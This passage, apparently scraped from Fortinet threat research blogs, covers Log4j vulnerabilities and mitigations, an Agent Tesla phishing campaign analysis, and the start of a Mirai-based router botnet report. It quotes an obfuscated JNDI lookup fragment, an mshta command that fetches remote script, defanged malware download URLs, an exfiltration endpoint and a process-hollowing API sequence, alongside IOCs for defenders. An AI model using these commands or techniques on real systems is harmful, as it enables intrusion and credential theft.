\"${${::-${::-$${::-j}}}}\"); Have attacks leveraging CVE-2021-44228 and CVE-2021-45046 increased? FortiGuard Labs saw a steady increase in the detection of attacks using our IPS signature, which covers both CVE’s - “Apache.Log4j.Error.Log.Remote.Code.Execution” - up until December 15 th . What versions of Log4j are vulnerable? CVE-2021-44228 : All Log4j versions from 2.0-beta9 through 2.12.1, and 2.13.0 through 2.14.1 (also includes 2.15.0-rc1) are vulnerable. CVE-2021-45046 : Log4j versions from 2.0-beta9 through 2.15.0 CVE-2021-45105 : Log4j versions from 2.0-beta9 to 2.16.0 Have these vulnerabilities been patched? Yes, Java 8 or later users are advised to update to Log4j 2.17.0 as soon as possible. However, due to the incompleteness of the fix offered in 2.15.0, Apache released subsequent Log4j versions 2.16.0, 2.17.0 which users are strongly advised to apply. For Java 7, users should upgrade to version 2.12.2. Has the vendor provided any mitigations? Yes, Apache has provided the following mitigation information for Log4Shell (CVE-2021-44228): Log4j 1.x mitigation: Log4j 1.x does not have Lookups, so the risk is lower. Applications using Log4j 1.x are only vulnerable to this attack when using JNDI in their configuration. A separate CVE (CVE-2021-4104) has been filed for this vulnerability. To mitigate: audit your logging configuration to ensure it has no JMSAppender configured. This vulnerability does not impact Log4j 1.x configurations without JMSAppender. Log4j 2.x mitigation: Implement one of the mitigation techniques below. Java 8 (or later) users should upgrade to release 2.16.0. Users requiring Java 7 should upgrade to release 2.12.2 when it becomes available (work in progress, expected to be available soon). Otherwise, remove the JndiLookup class from the classpath: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class Note that this vulnerability impacts only the log4j-core JAR file. Applications using only the log4j-api JAR file without the log4j-core JAR file are not affected by this vulnerability. Apache has provided the following mitigation information for CVE-2021-45046: Log4j 1.x mitigation Log4j 1.x is not impacted by this vulnerability. Log4j 2.x mitigation Implement one of the following mitigation techniques: Java 8 (or later) users should upgrade to release 2.16.0. Java 7 users should upgrade to release 2.12.2. Otherwise, in any release other than 2.16.0, you may remove the JndiLookup class from the classpath: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class Users are advised not to enable JNDI in Log4j 2.16.0. If the JMS Appender is required, use Log4j 2.12.2. Note that this vulnerability impacts only the log4j-core JAR file. Applications using only the log4j-api JAR file without the log4j-core JAR file are not affected by this vulnerability. Also, note that Apache Log4j is the only Logging Services subproject affected by this vulnerability. This does not impact other projects like Log4net and Log4cxx. Apache has provided the following mitigation information for CVE-2021-45105: Log4j 1.x mitigation Log4j 1.x is not impacted by this vulnerability. Log4j 2.x mitigation Implement one of the following mitigation techniques: Java 8 (or later) users should upgrade to release 2.17.0. Alternatively, this can be mitigated in the configuration: In PatternLayout in the logging configuration, replace Context Lookups like ${ctx:loginId} or $${ctx:loginId} with Thread Context Map patterns (%X, %mdc, or %MDC). Otherwise, in the configuration, remove references to Context Lookups like ${ctx:loginId} or $${ctx:loginId} where they originate from sources external to the application such as HTTP headers or user input. Note that this vulnerability impacts only the log4j-core JAR file. Applications using only the log4j-api JAR file without the log4j-core JAR file are not affected by this vulnerability. Also, note that Apache Log4j is the only Logging Services subproject affected by this vulnerability. This does not impact other projects like Log4net and Log4cxx. Does Fortinet protect against exploit attempts? Yes, Fortinet released IPS signature “Apache.Log4j.Error.Log.Remote.Code.Execution”, with VID 51006 to block exploit attempts for both CVE-2021-44228 and CVE-2021-45046. This signature was initially released in IPS package version 19.215. FortiGuard Labs provides IPS signature “Apache.Log4j.Error.Log.Thread.Context.DoS” against CVE-2021-45105. What malware and potentially unwanted applications(PUA) were observed to have been deployed via attacks leveraging Log4Shell? Malware such as Khonsari ransomware, Kinsing, Mirai, Muhstik, Elknot, m8220, Orcus RAT, XMRig, SitesLoader, and Nanocore RAT are all reported to have been delivered in these subsequent attacks. A video was also posted showing that it is possible to run the first-person shooting game Doom on a Minecraft server by abusing the vulnerability. Below are short descriptions of each malware type: Khonsari ransomware Khonsari is ransomware that encrypts files in specific folders on compromised machines and demands a ransom to decrypt them. It is called Khonsari because it adds .khonsari file extension to the files it encrypts. Kinsing Kinsing is malware written in Go that runs a cryptominer and attempts to propagate within the compromised environment. Kinsing has been around as early as January 2020. Mirai Mirai is multi-architecture Linux-based malware. Initially deployed on exposed networking devices, it is increasingly being used against IoT (Internet of Things) devices. Once infected, a compromised device becomes a bot that is absorbed into a botnet (a collection of bots). These botnets are primarily used for Distributed Denial of Service (DDoS) attacks. FortiGuard Labs previously posted blogs on Mirai malware: MANGA aka Dark Mirai-based Campaign Targets New TP-Link Router RCE Vulnerability The Ghosts of Mirai Mirai Botnet ­: Protect Your Infrastructure with FortiDDoS Elknot Also known as BillGates, this was initially only a Linux-based malware. However, it has since been ported to Windows. The malware is used to launch Distributed Denial of Service (DDoS) attacks. m8220 m8220 is a mining botnet for Windows and Linux platforms. Muhstik Muhstik is Linux malware that turns a compromised machine into a bot and is known to exploit vulnerabilities for propagation. One of the notable vulnerabilities exploited by Muhstik is Atlassian.Confluence.CVE-2021-26084.Remote.Code.Execution (CVE-2021-26084). FortiGuard Labs previously posted a blog on Muhkstik: Recent Attack Uses Vulnerability on Confluence Server Orcus RAT Orcus is a Remote Access Trojan (RAT) that has been heavily advertised and sold in underground forums since at least 2016. Although a Canadian software developer was arrested for creating and selling the RAT in 2019, Orcus RAT is in use today as its source code was leaked. As a RAT, it performs various actions on a compromised machine via commands received from its Command and Control server (C&C). SitesLoader The shell script dropper below downloads a UPX packed Go binary from http://103.104.73.155:8080/index . This binary is also an XMRig crypto miner. XMRig XMRig is an open-source cryptomining software that is used to mine Monero cryptocurrency. While XMRig is a legitimate software, it is often abused by threat actors to illegally mine Monero on the compromised machine. Nanocore RAT Nanocore is a modular Remote Access Trojan (RAT) that has been around since 2013. The RAT was available for purchase and cracked versions were leaked online. Nanocore performs typical RAT activities on the compromised machine, such as data exfiltration, keylogging, hijacking the webcams, and capturing screenshots. Has any Malware Incorporated the Recent Log4j Exploits for Propagation? FortiGuard Labs is aware of an online report that a variant of Mirai performs propagation by exploiting the Log4Shell vulnerability as such is a worm. Our analysis concludes that this Mirai variant is equipped with the Log4Shell exploit and CVE-2017-17215 , a remote code execution vulnerability in Huawei HG532 routers, and does not exhibit worm-like functionality. So, while our findings reveal that, like a worm, it can propagate, what makes it not a worm is that the botmaster controls all instructions. This is because it relies on an external resource for propagation and instruction. The botmaster also has the luxury of turning on and off scans. FortiGuard Labs detects this Mirai variant by AV as ELF/Mirai.VI!tr. FortiGuard Labs provides IPS coverage against CVE-2017-17215 as “Huawei.HG532.Remote.Code.Execution”. For FortiEDR, all known samples have been added to our cloud intelligence and will be blocked if executed. Has Fortinet released any publications regarding the recent Log4j vulnerabilities? Yes, Fortinet has released several publications since the issue came to light. Below is the list of released publications: Log4j2 Vulnerability (Outbreak Alert) Apache Log4J Remote Code Execution Vulnerability (CVE-2021-44228) (Threat Signal) New Log4j Vulnerability (CVE-2021-45046) Results in Denial of Service (Threat Signal) Log4j 2.17.0 Released In Response to New Log4j Vulnerability (CVE-2021-45105) (Threat Signal) Mirai Malware that Allegedly Propagates Using Log4Shell Spotted in the Wild (Threat Signal) Apache log4j2 log messages substitution (CVE-2021-44228) (PSIRT advisory) CVE-2021-44228 - Apache Log4j Vulnerability (PSIRT blog) Apache.Log4j.Error.Log.Remote.Code.Execution (Threat Encyclopedia) Technical Tip: How FortiEDR protects against the exploitation of Log4shell (FortiEDR) Conclusion The Log4j vulnerabilities had a significant global impact similar to previous major threats, such as Wannacry, Heartbleed, and Shellshock. Because it is deployed so widely, the after-effects of this vulnerability are expected to last for some time as so many enterprise applications and cloud services require updating. While the world has not yet seen any massive malware delivery events (i.e., a major ransomware outbreak, wormable events) that leverage the Log4j vulnerabilities, history tells us not to let our guard down, especially since the holiday season, when threat-actors typically become more active, is fast approaching. FortiGuard Labs will continue to actively monitor the situation for further insights and provide additional information about protections as they become available. Fortinet Protections and Mitigations FortiGuard Labs provides the following IPS signatures against CVE-2021-44228 (Log4Shell), CVE-2021-45046 and CVE-2021-45105: Apache.Log4j.Error.Log.Remote.Code.Execution (CVE-2021-44228 and CVE-2021-45046) Apache.Log4j.Error.Log.Thread.Context.DoS (CVE-2021-45105) Visit Outbreak Alert for more information on how Fortinet protects users from Log4Shell. FortiGuard Labs provides the following AV protection against malware, potentially unwanted programs (PUA), and other files involved as the following: MSIL/Filecoder.ANF!tr.ransom (Khonsari ransomware) BASH/CoinMiner.RZ!tr (kinsing) ELF/CoinMiner.CFA!tr (kinsing) ELF/Ganiw.A!tr (Elknot) Linux/Mirai.B!tr.bdr (Mirai) Linux/Tsunami.NCD!tr (Mirai) Adware/Tsunami (Mirai) ELF/DDoS.CIA!tr (Muhstik) BASH/Miner.BO!tr.dldr (m8220) Java/khonsari.DF40!tr (Orcus RAT) BASH/Miner.UF!tr (SitesLoader) Adware/Miner (SitesLoader) BASH/Agent.ACA8!tr.dldr Riskware/CoinMiner.PO (XMRig) Riskware/CVE202144228 (XMRig)BAT/Agent.Q!tr.dldr (XMRig) W32/GenKryptik.FBSU!tr (Nanocore RAT) All network IOCs are blocked by the WebFiltering client. Additionally, FortiGuard Labs provides the following AV coverage against older variants of malware that are delivered via Log4Shell: Kinsing BASH/Agent.KG!tr BASH/CoinMiner.AKT!tr BASH/Miner.DB!tr W64/CoinMiner.QG!tr BASH/CoinMiner.RZ!tr Mirai ELF/Mirai.[random alphabets] ELF/Mirai.[random alphabets]!tr Linux/Mirai[random alphabets]!tr Elknot Linux/Elknot.[random alphabets]!tr ELF/Elknot.[radom alphabets]!tr Orcus RAT W32/OrcusRAT.[random alphabets] W32/Orcus.[random alphabets]!tr W32/Orcus.[random alphabets]!tr.bdr Muhstik ELF/DDoS.CIA!tr BASH/Agent.MQ!tr Adware/Tsunami ELF/CoinMiner.CFA!tr ELF/BitCoinMiner.HF!tr BAT/Starter.NZ!tr BASH/CoinMiner.RZ!tr XMRig W32/XMRigMiner Riskware/XMRig_Miner W32/XMRig_Miner.[random alphabets]!tr Riskware/XMRigCoinMiner W32/XMRig_Miner.[random alphabets] Linux/XMrig.[random alphabets]!tr.dldr MSIL/XMRig_Miner.VC!tr W32/XMRigMiner.WIN64!tr W64/XMRigMiner.WIN64!tr W32/XMRig_Miner.ELF64!tr W32/XMRig_Miner.SMBM4!tr Nanocore RAT W32/Backdoor_MSIL_NANOCORE.BA!tr W32/NANOCORE.[random alphabets]!tr.bdr W32/NanoCore.[random alphabets and numbers]!tr Data/Nanocore.[random alphabets!tr W32/Backdoor_MSIL_NANOCORE.SMIL MSIL/NanoCore.[Random alphabets and numbers]!tr Adware/NanoCore Adware/Backdoor_MSIL_NANOCORE Apache has also provided mitigation advice for users of earlier versions, as described above. IOCs SHA-256 Hash f2e3f685256e5f31b05fc9f9ca470f527d7fdae28fa3190c8eba179473e20789 (Khonsari ransomware) 6e25ad03103a1a972b78c642bac09060fa79c460011dc5748cbb433cc459938b (Kinsing) 7e9663f87255ae2ff78eb882efe8736431368f341849fec000543f027bdb4512 (Kinsing) 8933820cf2769f6e7f1a711e188f551c3d5d3843c52167a34ab8d6eabb0a63ef (Kinsing) bcfdddb033fb1fa9c73e222919ecd4be071e87b0c54825af516b4f336bc47fa2 (Elknot) 0e574fd30e806fe4298b3cbccb8d1089454f42f52892f87554325cb352646049 (Mirai) 19370ef36f43904a57a667839727c09c50d5e94df43b9cfb3183ba766c4eae3d (Mirai) 2a4e636c4077b493868ea696db3be864126d1066cdc95131f522a4c9f5fb3fec (Mirai) 15e7942ebf88a51346d3a5975bb1c2d87996799e6255db9e92aed798d279b36b (Muhstik) 10fad59b071db09aafcb7f40e775f28180aed182786557e9ee7f2f2e332b4513 (m8220) 86fc70d24f79a34c46ef66112ef4756639fcad2f2d7288e0eeb0448ffab90428 (Orcus RAT) e7c5b3de93a3184dc99c98c7f45e6ff5f6881b15d4a56c144e2e53e96dcc0e82 (SitesLoader) f059246cea87a886acb1938809cf4a1152247a5b5a2df0b1bf64c46a0daccbcc (SitesLoader) 3e6567dab5e7c7c42a02ac47e8c68f61c9c481bbbbe5ddb1c68e86f7370dab45 (XMRig) 95ac2e2cd2caf30829a9588988601067a98f9bb02e0776a8ef2b813f9b4d8992 (XMRig) e8b2a8d0c3444c53f143d0b4ba87c23dd1b58b03fd0a6b1bcd6e8358e57807f1 (XMRig) bd5006ba4e4cfcf8a8b0b6da5bb30f4dd8a78beb351b814431ae8599dcf23f1b (Nanocore RAT) e9744244461056c64fc390591729c035f3a375bc8ecfa1a0c111defa055c1273 (Mirai variant with alleged worm capability) URLs 3[.]145.115.94/zambo/groenhuyzen[.]exe 3[.]145.115.94/zambos_caldo_de_p.txt hxxp://3[.]145.115.94/main.class hxxp://45[.]137.155.55/kinsing hxxp://45[.]137.155.55/kinsing2 hxxp://80[.]71.158.12/kinsing hxxp://80[.]71.158.44/kinsing hxxp://82[.]118.18.201/kinsing hxxp://92[.]242.40.21/kinsing hxxp://93[.]189.42.8/kinsing hxxp://92[.]242.40.21/lh2.sh hxxp://45[.]137.155.55/ex.sh hxxp://155[.]94.154.170/aaa hxxp://138[.]197.206.223/wp-content/themes/twentysixteen/dk86 hxxp://34[.]221.40.237/.x/pty5 hxxp://34[.]221.40.237/.x/pty9 nazi[.]uy hxxp://agent[.]apacheorg.xyz:1234/v hxxp://185[.]250.148.157:8005/index hxxp://103[.]104.73.155:8080/acc hxxp://129[.]226.180.53/xmrig_setup/raw/master/setup_c3pool_miner.sh hxxp://download[.]c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh hxxp://54[.]210.230.186/wp-content/themes/twentyfourteen/xmrig.exe hxxp://198[.]98.60.67/bins/x86 hxxp://198.98.60.67/bins/arm hxxp://198.98.60.67/lh.sh Learn more about Fortinet’s FortiGuard Labs threat research and intelligence organization and the FortiGuard Security Subscriptions and Services portfolio ."
            }
        },
        {
            "https://www.fortinet.com/blog/threat-research/phishing-campaign-targeting-korean-to-deliver-agent-tesla-new-variant": {
                "metadata": {
                    "dateAccessed": "2022-01-06",
                    "dateCreated": "2021-12-10",
                    "source": "www.fortinet.com"
                },
                "text": "FortiGuard Labs Threat Research Report Affected platforms: Microsoft Windows Impacted parties: Windows Users Impact: Collects sensitive information from victims’ device Severity level :          Critical A phishing campaign was recently caught in the wild by Fortinet’s FortiGuard Labs , that delivers a malicious Microsoft PowerPoint file. The content of the phishing email,  written in Korean, asks recipients to open the attached PowerPoint file to review a purchase order. I researched what this malicious file does once the PowerPoint file is opened and have been able to confirm that it is spreading a new variant of Agent Tesla. Over the past several years, we have captured and analyzed many Agent Tesla variants. It has been quite active since 2014 when it was first observed. Agent Tesla is a .Net-based malware (developed in C#.Net, VB.Net, C++.Net, etc.) whose core function is to collect sensitive information from a victim’s machine, including recording keystrokes and data on the system clipboard, stealing saved software credentials (browsers, mail clients, VPN, FTP, IM, etc.), stealing browser cookies files, and taking screenshots. In this blog we will look at the phishing email, analyze the malicious macro contained in the attachment, show how the malware is updated and maintains persistence, examine the Agent Tesla payload, and show the ways it exfiltrates stolen data and credentials. Let’s start with how most cyberattacks begin – with a phishing email. The Phishing Email The phishing email is written in Korean and its translated content has been included on the right side of the image in Figure 1.1. The attacker attempts to lure the recipient into opening the attached file to confirm a purchase order. Fortinet’s FortiMail has identified this phishing email as SPAM and added a tag “[SPAM detected by FortiMail]” to the subject to warn the recipient, as shown in Figure 1.1. Leverage Malicious Macro in PowerPoint As you probably guessed, the attached file is fake. There is no slide in the PowerPoint file, but a macro containing an auto-run function method called “Auto_Open()”. This function is called once the file is opened in MS PowerPoint. Here is the VBA code of this method: “soraj” is the name of a UserForm, “bear” is the name of CheckBox control inside “soraj” form. It calls “Shell” to execute a command read from the “GroupName” property of “bear” CheckBox control. In this code, “soraj” is the name of a UserForm and “bear” is the name of the CheckBox control inside the “soraj” form. It calls “Shell” to execute a command read from the “GroupName” property of the “bear” CheckBox control. Further, “mshta hxxp[:]//bitly[.]com/gdhamksgdsadj” is the value of the “soraj.bear.GroupName” which is shown in Figure 2, and is the content of a binary profile file (named “o”) of the VBA project. It consists of “mshta” and a URL, where “mshta” (“mshta.exe”) is a Windows default program that executes HTML application files, including scripts (like VBScript). The URL opened by “mshta” is redirected to another URL, “hxxps[:]//onedayiwillloveyouforever[.]blogspot.com/p/divine111.html”, which contains a piece of code used to write an escaped VBScript code to a current HTML document to be executed by “mshta.exe”. Figure 2.2 is a screenshot of a proxy tool, allowing you to see the URL redirection and escaped VBScript code in the response packet. The escaped VBScript code is executed within the current HTML document using “mshat.exe”. I will refer to this kind of VBScript as VBScript-embedded-in-HTML in this analysis. Click here to view the entire un-escaped code of the VBScript-embedded-in-HTML. VBScript, PowerShell scripts for multiple tasks The developer uses a wide variety of scripts, including VBScript-embedded-in-HTML, standalone VBScript, and PowerShell, during the process of delivering Agent Tesla to protect it from being easily analyzed. These scripts are split into many files, and are downloaded at different times. The VBScript-embedded-in-HTML is the entry of the scripts. In the following section I will explain what they can do according to their behaviors. 1. Upgrading – Task Scheduler: The malware seeks to obtain a new version (if applicable) every two hours to be executed on the victim’s system. To do this the VBScript-embedded-in-HTML performs a command-line command to add a recurring task into Task Scheduler. The code snippet below is used to run “schtasks” command with the “/create” option to create a new scheduled task, as shown in Figure 3.1. It executes a VBScript code within a remote HTML file, then downloads the Agent Tesla payload to run on the victim’s system. It also detects and kills any other Agent Tesla process instances already running. This allows it to perform its upgrading function. 2. Persistence – StartMenu Startup: A standalone VBS file, “%Public%\\ hulalalMCROSOFT.vbs ”, extracted from VBScript-embedded-in-HTML downloads another base64-encoded VBS file from “hxxps[:]//bitbucket[.]org/!api/2.0/snippets/hogya/5X7My8/b271c1b3c7a78e7b68fa388ed463c7cc1dc32ddb/files/divine1-2” into a local file. Going through the base64-decoded code, it saves the VBS code to a file called “UYA-update.vbs“ located under %Public% folder. This standalone VBS file downloads the Agent Tesla payload and deploys it on the victim’s system. As a result, whenever the VBS file is executed it starts Agent Tesla. To keep Agent Tesla alive on the victim’s system, it copies the downloaded standalone VBS file “UYA-update.vbs” into the StartMenu’s Startup folder and renames it as “GTQ.vbs”. This allows it to start automatically when the system starts. Figure 3.2 displays the Startup folder with the copied “GTQ.vbs”. 3. Perform process-hollowing: “UYA-update.vbs” continues to craft a piece of PowerShell code within a base64-decoded PE file from a local variable. It is ultimately executed by “PowerShell.exe”. The decoded PE file is a .Net program that contains a function named “Run()” belonging to class “ClassLibrary3.Class1”. Below is a piece of PowerShell code used to call this function. The “$fuUN” variable contains the base64-decoded .Net PE file, from which it calls GetType() and GetMethod() to obtain the function “ClassLibrary3.Class1.Run()”. Next, it calls the “Run()” function through Invoke() and passes a parameter with a reversed URL. The URL is “hxxps[:]//bitbucket[.]org/!api/2.0/snippets/hogya/nxq8od/c73df176f221868c33d4b3033ec04dc173d4ba4c/files/divine1-1”. Figure 3.3 is the entire code of function “ClassLibrary3.Class1.Run()”. After successfully calling \"ClassLibrary3.Class1.Run()\" of the decoded PE, it downloads two files from the hyperlinks: 'hxxp[:]//149.56.200.165/rump/1.txt', which is for another .Net module to perform process-hollowing, and 'hxxps[:]//bitbucket[.]org/!api/2.0/snippets/hogya/nxq8od/c73df176f221868c33d4b3033ec04dc173d4ba4c/files/divine1-1', which is passed from PowerShell and is where it downloads the Agent Tesla payload from. The Agent Tesla payload is fileless on the victim’s system. It is only kept in the memory of the PowerShell process. The downloaded .Net module has a function named “ClassLibrary1.Class1.Run()” that perform the process-hollowing. It passes the Agent Tesla payload in memory and adds a path of the target process “RegAsm.exe”. “RegAsm.exe” is an official component of Microsoft .Net Framework. The attacker uses it as a target process in which to inject malware to protect itself from being detected. A number of Windows API functions are called in the .Net module to deploy the Agent Tesla payload into the target process. These are: CreateProcess() with CREATE_SUSPENDED flag: This creates a suspended RegAsm.exe process. VirtualAllocEx(), NtUnmapViewOfSection(), ReadProcessMemory(), WriteProcessMemory(): These move the Agent Tesla payload to a newly-allocated memory within the suspended RegAsm.exe process. SetThreadContext()/Wow64SetThreadContext(), GetThreadContext()/Wow64GetThreadContext(): These modify the RegAsm.exe’s registry value and points its EIP register to the entry point of the copied Agent Tesla payload. ResumeThread(): This resumes the execution of the RegAsm.exe process from where the EIP points to. Once completed, the Agent Tesla runs on behalf of RegAsm.exe to steal the victim’s information. Agent Tesla Payload Agent Tesla provides many features, like Keylogger, obtaining Clipboard data, stealing browser cookies and saved software credentials, as well as capturing screenshots of the victim’s device. Agent Tesla publishes a Setup program that allows the attacker to choose which features to enable. The Tesla Agent Setup program then compiles the Agent Tesla payload file according to those choices. Agent Tesla starts these tasks in its Main() (stealing credentials), Timer (keylogger, stealing clipboard data, taking screenshots), and Thread (stealing cookies from browsers) functions. In this variant of Agent Tesla, the attacker has only enabled stealing credentials and cookies. The count of the software clients from which it steals credentials is more than 70, and can be categorized as Web Browsers, Email Clients, IM Clients, VPN/FTP/Downloader/Database Clients, and Windows Credentials. The list of the affected software clients is listed as below: Chromium-based Web Browsers: Epic Privacy, Uran, Chedot, Comodo Dragon, Chromium, Orbitum, Cool Novo, Sputnik, Coowon, Brave, Liebao Browser, Elements Browser, Sleipnir 6, Vivaldi, 360 Browser, Torch Browser, Yandex Browser, QIP Surf, Amigo, Kometa, Citrio, Opera Browser, CentBrowser, 7Star, Coccoc, and Iridium Browser. Web Browsers: Chrome, Microsoft Edge, Firefox, Safari, IceCat, Waterfox, Tencent QQBrowser, Flock Browser, SeaMonkey, IceDragon, Falkon, UCBrowser, Cyberfox, K-Meleon, PaleMoon. VPN clients: OpenVPN, NordVPN, RealVNC, TightVNC, UltraVNC, Private Internet Access VPN. FTP clients: FileZilla, Cftp, WS_FTP, FTP Navigator, FlashFXP, SmartFTP, WinSCP 2, CoreFTP, FTPGetter. Email clients: Outlook, Postbox, Thunderbird, Mailbird, eM Client, Claws-mail, Opera Mail, Foxmail, Qualcomm Eudora, IncrediMail, Pocomail, Becky! Internet Mail, The Bat!. Downloader/IM clients: DownloadManager, jDownloader, Psi+, Trillian. Others: MySQL and Microsoft Credentials. Figure 4.1 displays the method used for stealing credentials from several clients. Figure 4.2 shows the credentials just stolen from a web browser, “IceCat”, where “Browser” is the software client name, “Password” is the saved password, “URL” is the login page, and “UserName” is the saved login user name. Each credentials of the stolen credentials has an above structure and saved in a global list variable, which later is formatted and sent to the attacker. Sending the Stolen Data to the Attacker There are four ways to transport the stolen data to the attacker. These are FTP Data (uploading stolen data in a file to a FTP server provided by the attacker), HTTP Post (sending data as the body of the post to a URL provided by the attacker), SMTP (sending stolen data to the attacker’s email address), and Telegram (using the Telegram bot API “sendDocument()” to send files to a specified chat or channel). The attacker chose HTTP Post for this variant. Once Agent Tesla needs to send data to the attacker, it encrypts the stolen data using a DES algorithm and encodes the result using a base64 algorithm, which is the final data to be sent as the body in the HTTP Post request. The submission URL is \"hxxp[:]//69[.]174.99[.]181/webpanel-divine/mawa/7dd66d9f8e1cf61ae198.php\", which is a hardcoded string in Agent Tesla. Figure 5.1 demonstrates Agent Tesla sending stolen data as a value of “p=” in the body of HTTP POST. Each item of stolen data before encryption is kept in the structure — “header” + “data”. The “header” contains the basic information of the victim’s system: “Packet number” + ”Separator” + “Victim ID” + ”Separator” + “Date and Time” + ”Separator string” + “UserName/ComputerName” + ”Separator” The “data” contains the stolen information, like credentials and cookies. Figure 5.2 shows an example of data with packet number “6”, which contains the basic information (“header” part) and the Stolen Data (“data” part) that is base64-encoded cookies. “0de264895c1ed90486c73c6eb110af6c2222264a0854b0047b9ead88b718f7d0\" is the Separator string that is hardcoded in Agent Tesla. The Victim ID is a MD5 hash value generated from the system’s hardware information. Agent Tesla provides seven kinds of packets to send data/status to the attacker. Each packet has a packet number to identify the packet. They are “0”, “1”, “2”, “3”, “4”, “5” and “6”. Packet “0”: It is always the first packet to tell the attacker that Agent Tesla has started. It only contains the “header” data. Packet “1”: It is sent once every 120 seconds. It is like a heartbeat to tell the attacker that Agent Tesla is alive. It only contains the “header” data. Packet “2”: It is sent every 60 seconds and only contains the “header” data. Agent Tesla reads the response and checks if it contains “uninstall”. If yes, it uninstalls Agent Tesla from the victim’s system, including deleting all files made by Agent Tesla and removing keys from registry that Agent Tesla created, and exits the process. Packet “3”: It sends the victim’s keystrokes (keylogger data) and stolen clipboard data within the “data” part of the post. Packet “4”: It sends captured screenshots of the victim’s screen within the “data” part of the post. Packet “5”: It sends the credentials stolen from the software clients within the “data” part of the post. Packet “6”: It sends cookies files in a ZIP archive that are collected from browsers and included within the “data” part of the post. Conclusion In this analysis, I have shown how this phishing campaign began by targeting Korean users. I then explained how the macro in the PowerPoint is used to execute a piece of VBScript-embedded-in-HTML code. It also leverages a complicated standalone VBS and PowerShell script code to perform multiple tasks, like upgrading, maintaining persistence, and process-hollowing. I then elaborated on what kind of software clients the Agent Tesla targets and what kind of data it is able to collect from them, as well as how the stolen data is sent to the attacker via the HTTP Post method. Fortinet Protections Fortinet customers are already protected from this malware by FortiGuard’s Web Filtering , AntiVirus, FortiEDR , and CDR (content disarm and reconstruction) services, as follows: The malicious Macro inside the PowerPoint sample can be disarmed by the FortiGuard CDR (content disarm and reconstruction) service. All relevant URLs have been rated as \" Malicious Websites \" by the FortiGuard Web Filtering service. The PowerPoint sample attached to the phishing email and the standalone VBS file are detected as \" VBA/Agent.BLY!tr \" and \" VBS/AgentTesla.VTO!tr.dldr \" and are blocked by the FortiGuard AntiVirus service. FortiEDR detects the downloaded executable file as malicious based on its behavior. FortiMail protects Fortinet customers by blocking phishing emails and applying FortiGuard’s Web Filtering, AntiVirus, and CDR (content disarm and reconstruction) technologies. In addition to these protections, we suggest that organizations have their end users also go through the FREE NSE training : NSE 1 – Information Security Awareness . It includes a module on Internet threats that is designed to help end users learn how to identify and protect themselves from phishing attacks. IOCs URLs Involved in the Campaign: \"hxxps[:]//onedayiwillloveyouforever[.]blogspot[.]com/p/divine111.html\" \"hxxps[:]//madarbloghogya[.]blogspot[.]com/p/divineback222.html\" \"hxxps[:]//bitbucket[.]org/!api/2.0/snippets/hogya/5X7My8/b271c1b3c7a78e7b68fa388ed463c7cc1dc32ddb/files/divine1-2\" \"hxxp[:]//149[.]56.200[.]165/rump/1.txt\" \"hxxps[:]//bitbucket[.]org/!api/2.0/snippets/hogya/nxq8od/c73df176f221868c33d4b3033ec04dc173d4ba4c/files/divine1-1\" \"hxxp[:]//69[.]174.99[.]181/webpanel-divine/mawa/7dd66d9f8e1cf61ae198.php\" Sample SHA-256 Involved in the Campaign: [새 구매 주문서 .ppa / new purchase order.ppa] AA121762EB34D32C7D831D7ABCEC34F5A4241AF9E669E5CC43A49A071BD6E894 [UYA-update.vbs / GTQ.vbs] 0BBF16E320FB942E4EA09BB9E953076A4620F59E5FFAEFC3A2FFE8B8C2B3389C Learn more about FortiGuard Labs global threat intelligence and research and the FortiGuard Security Subscriptions and Services portfolio."
            }
        },
        {
            "https://www.fortinet.com/blog/threat-research/manga-aka-dark-mirai-based-campaign-targets-new-tp-link-router-rce-vulnerability": {
                "metadata": {
                    "dateAccessed": "2022-01-06",
                    "dateCreated": "2021-12-08",
                    "source": "www.fortinet.com"
                },
                "text": "FortiGuard Labs Threat Research Report Affected Platforms: Linux Impacted Users: Any organization Impact: Remote attackers gain control of the vulnerable systems Severity Level: Critical Last week, our FortiGuard Labs team encountered a malware sample that’s currently being distributed in the wild targeting TP-link wireless routers. It leverages a recently post-authenticated RCE vulnerability released barely two weeks prior. As it turns out, it is an updated variant of the MANGA campaign (also known as Dark) that distributes samples based on Mirai’s published source code. This Mirai-based Distributed Denial of Service (DDOS) botnet campaign is one that FortiGuard Labs has been actively monitoring . The campaign originally piqued our interest due to the continuous updating of its list of target vulnerabilities—more so than other campaigns we have seen so far. TP-Link has already released an updated firmware for this affected hardware version  and users are strongly encouraged to update their devices. This post details how this threat leverages the new vulnerability to take over the affected devices and ways to protect users from these attacks. Exploiting a New Vulnerability This Mirai-based botnet campaign is referred to as MANGA because of the token string it used to include in its SSH/telnet commands. It is also referred to as Dark due to the filenames used for its binaries (e.g., Dark.arm, dark.mips, etc.). By exploiting recently published vulnerabilities, this malware campaign capitalizes on the gap between the time of disclosure of a vulnerability and the application of a patch to compromise IoT devices. This gives it a higher potential of spreading, making it more prolific than similar botnets. The latest addition to its constantly growing list of targeted vulnerabilities is TP-Link Home Wireless Routers, particularly the TL-WR840N EU (V5) model. The vulnerability it targets, assigned CVE-2021-41653 , was only just discovered on November 12 of this year. And barely two weeks later, on November 22, a sample from the MANGA malware campaign was seen actively exploiting it in the wild. Kamilló Matek discusses the full details of this vulnerability in this article . In summary, a vulnerable host parameter allows authenticated users to execute arbitrary commands in the target device. In this case, it is being exploited to force vulnerable devices to download and execute a malicious script, tshit.sh , which then downloads the main binary payloads, as discussed in the next section. To accomplish this, the following requests are sent to the device: Request 1: Request 2: It is important to emphasize that this exploitation requires authentication to succeed. Therefore, it is crucial for users to change their default credentials. Same Package As with Mirai’s normal infection routine, the executed shell script downloads the main payload binaries for different architectures and platforms and executes them blindly in the victim’s system. In addition, it prevents other botnets from taking over the device by blocking connections to commonly targeted ports. The malware then waits for a command from its Command-and-Control (C2) server to perform different variations of a Denial-Of-Service (DOS) attack. Solution Fortinet customers are protected by the following: The following generic FortiGuard IPS signatures were able to detect this attack before this vulnerability was disclosed: TP-Link.HTTP.Management.Code.Execution TP-Link.Home.Wifi.Router.CGI.Referer.Command.Injection The FortiGuard Web Filtering Service blocks downloaded URLs and identified C2s. The FortiGuard AntiVirus service detects and blocks this threat as Linux/Mirai and ELF/Mirai Conclusion Through our active monitoring, we encountered a new variant of the Mirai-based botnet campaign referred to as MANGA or Dark. It targets a recently published TP-Link wireless router RCE vulnerability. Throughout its life, this ongoing campaign has been very active in targeting newly discovered vulnerabilities. In fact, 